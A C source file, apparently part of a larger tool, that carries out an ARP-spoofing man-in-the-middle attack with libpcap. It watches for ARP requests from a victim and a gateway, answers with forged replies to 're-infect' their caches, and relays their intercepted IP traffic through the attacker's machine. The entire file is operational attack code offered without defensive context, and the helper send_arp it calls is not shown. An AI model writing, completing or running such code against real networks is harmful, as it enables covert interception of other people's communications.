#include <stdio.h>
#include <pcap.h>
#include <netinet/ether.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>
#include <arpa/inet.h>
#include <netinet/in.h>
#include <net/if_arp.h>
#include <string.h>



void arp_spoofing(pcap_t *handle, struct in_addr *attacker_ip, struct ether_addr *attacker_mac, struct in_addr *victim_ip, struct ether_addr *victim_mac, struct in_addr *gateway_ip, struct ether_addr *gateway_mac){
	struct ether_header *ether;
	struct ether_arp *arp;
	struct pcap_pkthdr header;
	struct ip *ipv4;
	const u_char *packet;
	
	while(1) 
	{
    	packet = pcap_next(handle, &header);

    	if(packet != NULL) 
    	{
    		ether = (struct ether_header*)packet;

			//////////////////////////////Re-Infection//////////////////////////////

			if(ntohs(ether->ether_type) == ETHERTYPE_ARP)
			{
				arp = (struct ether_arp *)(packet+14);
			
			//////////////////////////////check victim's arp request//////////////////////////////
			
				if(memcmp(victim_ip, arp->arp_spa, sizeof(struct in_addr)) ==0)
				{
					if(memcmp(gateway_ip, arp->arp_tpa, sizeof(struct in_addr)) ==0)
					{
						send_arp(handle, victim_mac, attacker_mac, gateway_ip, victim_ip);
						printf("Victim is re - infected!!!\n\n");
					}
				}
			//////////////////////////////check gateway's arp request//////////////////////////////

				if(memcmp(gateway_ip, arp->arp_spa, sizeof(struct in_addr)) ==0)
				{
					if(memcmp(victim_ip, arp->arp_tpa, sizeof(struct in_addr)) ==0)
					{
						send_arp(handle, gateway_mac, attacker_mac, victim_ip, gateway_ip);
						printf("Gateway is re - infected!!!\n\n");
					}
				}
			}

			//////////////////////////////Relay IP Packet//////////////////////////////

			else if(ntohs(ether->ether_type) == ETHERTYPE_IP)
			{
				ipv4 = (struct ip*)(packet+14);

			//////////////////////////////Attacker -> Gateway//////////////////////////////	
				
				if((memcmp(ether->ether_shost, victim_mac, ETHER_ADDR_LEN) ==0) && memcmp(ether->ether_dhost, attacker_mac, ETHER_ADDR_LEN) == 0)
				{	
					if(memcmp(&ipv4->ip_dst, attacker_ip, sizeof(struct in_addr))!=0)
					{
						memcpy(&ether->ether_dhost, gateway_mac, ETHER_ADDR_LEN);
						memcpy(&ether->ether_shost, attacker_mac, ETHER_ADDR_LEN);
						
						if(pcap_sendpacket(handle, packet, header.caplen) == -1)
							printf("error3\n");
						else
							printf("Relay to Gateway!!!\n\n");
					}
				}

			//////////////////////////////Attacker -> Victim//////////////////////////////		

				else if((memcmp(ether->ether_shost, gateway_mac, ETHER_ADDR_LEN) ==0) && memcmp(ether->ether_dhost, attacker_mac, ETHER_ADDR_LEN) == 0)
				{
					if(memcmp(&ipv4->ip_dst, victim_ip, sizeof(struct in_addr)) == 0)
					{
						memcpy(&ether->ether_dhost, victim_mac, ETHER_ADDR_LEN);
						memcpy(&ether->ether_shost, attacker_mac, ETHER_ADDR_LEN);

						if(pcap_sendpacket(handle, packet, header.caplen) == -1)
							printf("error4\n");
						else
							printf("Relay to Victim!!!\n\n");
					}
				}
			}
    	}
    }
}